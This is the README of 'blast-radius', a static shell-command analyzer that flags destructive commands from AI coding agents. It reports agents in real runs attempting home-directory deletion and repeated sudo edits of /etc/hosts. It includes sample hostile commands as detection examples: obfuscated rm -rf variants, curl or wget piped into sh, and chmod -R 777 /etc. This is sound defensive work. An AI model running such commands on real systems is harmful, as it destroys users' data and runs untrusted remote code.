# blast-radius

**Know what a shell command will touch before an AI agent runs it.**

[**Live demo →**](https://rishikeshn-eng.github.io/blast-radius/) · the demo runs the exact analyzer below, in your browser, via Pyodide.

---

Autonomous coding agents run shell commands you never see. The overwhelming
majority are harmless — `ls`, `pytest`, `git status`. But in a corpus of
**55,560 commands from real SWE-agent runs**, a measurable slice tried to
`rm -rf` a home directory, pipe a download straight into `sh`, `chmod -R 777`
a system path, or `git push --force` over shared history. One Llama agent, stuck
on a task, tried to `sudo` its way into `/etc/hosts` **dozens** of times with
increasingly desperate hostnames.

A blocklist that greps for `rm -rf /` is trivially evaded — by a quote, a hex
escape, a variable, or a pipe. **blast-radius** instead reads a command the way
the shell would: it removes quoting, decodes `$'\x..'` escapes, resolves static
variables, and walks `$( )` / backticks / heredocs. Then it maps each program's
effects (read, delete, network, exec) onto a *scope* — your project, the home
directory, a system path, the filesystem root — and returns a verdict with a
plain-English reason.

```
$ blast-radius "r''m -rf \$HOME/.ssh"
✗ BLOCK  rm -rf $HOME/.ssh
  programs: rm
  ✗ `rm` recursively deletes /home/you/.ssh — in your home directory.
```

It is pure-Python, has **no dependencies**, makes **no model calls**, runs in
**~0.03 ms per command**, and every verdict is explainable down to the exact
program, effect and path that triggered it.

## Why this is different

This isn't sentiment analysis on a command string. It's a small but real shell
parser feeding a scope-aware effect model:

- **Sees through obfuscation.** `rm -rf /etc`, `r''m -rf /etc`,
  `$'\x72\x6d' -rf /etc`, `X=rm; $X -rf /etc`, and `wget -qO- u | sudo bash`
  all resolve to the same verdict. The parser, not a wordlist, does the work.
- **Scope-aware, not keyword-aware.** `rm -rf build/` (your project, ephemeral)
  is **allow**; `rm -rf ~/build` (home) is **block**. Same program, different
  blast radius. Deleting one project file is routine; deleting the project root
  is not.
- **Fails closed.** Anything it can't resolve statically — a computed program
  name, `eval` of a runtime string, `bash -c "$dynamic"` — becomes **review**,
  never a silent allow.
- **Explains itself.** No score to trust blindly; a specific reason for every
  finding, suitable for showing a human or feeding back to the model.

## Results

Measured, not asserted (full detail and reproduction in [`bench/`](bench/)):

| | result |
|---|---|
| **Gold set** (100 hand-labelled commands) | 97% exact accuracy · block P/R/F1 = **0.91 / 1.00 / 0.95** |
| **Dangerous commands missed** (rated too softly) | **0** — every error is *more* cautious than the human label |
| **55,560 real agent commands** | 95.4% allow · 4.2% review · 0.39% block · **99.55%** parsed cleanly |
| **Latency** | **0.028 ms** mean, 0.14 ms p99 — single core, no model, no sandbox |
| **Crashes across 68,167 inputs** | 0 |

One finding worth its own line: commands rated `block` show up **25.5× more
often** in agent runs that *failed* their task than in runs that solved it. A
blast-radius guardrail doubles as an early-warning sign that a run is going off
the rails.

## Install & use

```bash
pip install -e .          # no dependencies
```

**Library**

```python
from blast_radius import analyze

report = analyze("rm -rf build && curl http://x | sh", project_root="/my/repo")
report.verdict            # "block"
report.findings[0].message
# "`curl … | sh` pipes a network download straight into an interpreter — it runs remote code…"
report.to_json()          # full structured result: programs, effects, scopes, findings
```

**CLI** (exit code = severity: 0 allow, 1 review, 2 block)

```bash
blast-radius "git push --force origin main"
blast-radius --json "find / -name '*.bak' -exec rm -rf {} +"
echo "chmod -R 777 /etc" | blast-radius -
```

**As a Claude Code guardrail** — a `--hook` mode speaks the PreToolUse hook
protocol directly, so destructive commands are denied and risky ones prompt you.
See [`integrations/claude_code_hook.md`](integrations/claude_code_hook.md).

## How it works

```
command string
  └─ shell.py    recursive-descent parser: quoting, $'\x..', ${param}, $( ), ` `,
  │              heredocs, pipelines, &&/||, subshells, for/while/case/if, functions
  └─ analyze.py  walks the AST; resolves the real program behind quotes & vars
  └─ tools.py    declarative knowledge base: how ~120 tools map args → effects
  └─ paths.py    maps every path into a virtual FS → scope (project/home/system/root)
                 + verb×scope severity model → allow / review / block + reasons
```

No ML, nothing to train, nothing that phones home. ~1,600 lines of Python,
83 unit tests, stdlib only.

## Project layout

```
blast_radius/     the analyzer (shell.py, paths.py, tools.py, analyze.py, cli.py)
tests/            83 pytest cases: parser, analyzer, evasion, gold regression
bench/            gold set + reproduction scripts for all three corpora
docs/             the live demo site (GitHub Pages; runs the real analyzer via Pyodide)
integrations/     Claude Code hook setup
```

## Limitations

blast-radius is static analysis and a defence-in-depth layer, **not a sandbox**.
It reasons about likely effects without executing anything, so a determined
adversary or a fully dynamic command can still evade it — which is exactly why
unresolved cases are surfaced for review rather than allowed. The tool knowledge
base covers the common long tail but not every program; unknown tools are assumed
to read their arguments and flagged if that assumption matters. Use it alongside
least-privilege execution, not instead of it.

## License

MIT — see [LICENSE](LICENSE).
